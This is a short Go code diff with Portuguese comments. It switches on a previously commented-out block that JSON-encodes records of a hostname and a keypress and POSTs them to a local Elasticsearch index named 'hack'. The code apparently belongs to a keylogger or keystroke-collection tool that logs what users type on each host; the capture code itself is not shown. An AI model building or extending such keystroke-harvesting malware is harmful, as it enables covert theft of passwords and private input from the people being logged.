@@ -1,9 +1,12 @@
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
+	"net/http"
 	"os"
 	"os/exec"
 	"strings"
@@ -146,24 +149,24 @@ func main() {
 				}
 				fmt.Printf("host %s voce digitou %s \n", dados.Hostname, dados.Keypress)
 				///////////////////////////
-				/*	codigo para enviar pro elastic (dando erro na query de envio)
-					buf := new(bytes.Buffer)
-					json.NewEncoder(buf).Encode(dados)
-					req, _ := http.NewRequest("PUT", "http://localhost:9200/test", buf)
-					req.Header.Set("Content-Type", "application/json")
-					client := &http.Client{}
-					res, e := client.Do(req)
-					if e != nil {
-						log.Fatal(e)
-					}
+				//codigo para enviar pro elastic (dando erro na query de envio)
+				buf := new(bytes.Buffer)
+				json.NewEncoder(buf).Encode(dados)
+				req, _ := http.NewRequest("POST", "http://localhost:9200/index/hack", buf)
+				req.Header.Set("Content-Type", "application/json")
+				client := &http.Client{}
+				res, e := client.Do(req)
+				if e != nil {
+					log.Fatal(e)
+				}
 
-					defer res.Body.Close()
+				defer res.Body.Close()
 
-					fmt.Println("response Status:", res.Status)
+				fmt.Println("response Status:", res.Status)
 
-					// Print the body to the stdout
-					io.Copy(os.Stdout, res.Body)
-				*/
+				// Print the body to the stdout
+				io.Copy(os.Stdout, res.Body)
+
 				/////////////////////////////
 				/*
 					//novo bloco
